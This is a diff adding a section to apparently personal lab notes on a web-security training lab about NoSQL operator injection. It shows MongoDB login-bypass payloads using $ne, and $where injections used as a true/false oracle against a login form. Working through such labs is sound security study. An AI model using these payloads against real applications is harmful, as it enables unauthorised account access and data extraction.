@@ -183,3 +183,33 @@ I get back:
 This response indicates that the `$ne` operator has been accepted and the application is vulnerable
 
 
+### Lab: Exploiting NoSQL operator injection to extract unknown fields  
+User login is vulnerable to nosqli. We try:
+```
+{
+    "username":"carlos",
+    "password":{
+        "$ne": ""
+    }
+}
+```
+We get back `account is locked` error.
+Mongo also has `$where` operator which accepts a string of a javascript code.
+So we try:
+```bash
+{"username":"carlos","password":{"$ne":"invalid"}, "$where": "function() {return 0}"}
+```
+Or the same but simplified:
+```bash
+{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}
+```
+And we receive: `Invalid username or password` err.
+If we change `"$where": "1"`
+We get `account locked` err again
+
+After the injection on the backend it probably looks something like:
+```bash
+await userMongooseModel.find({"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"})
+```
+
+
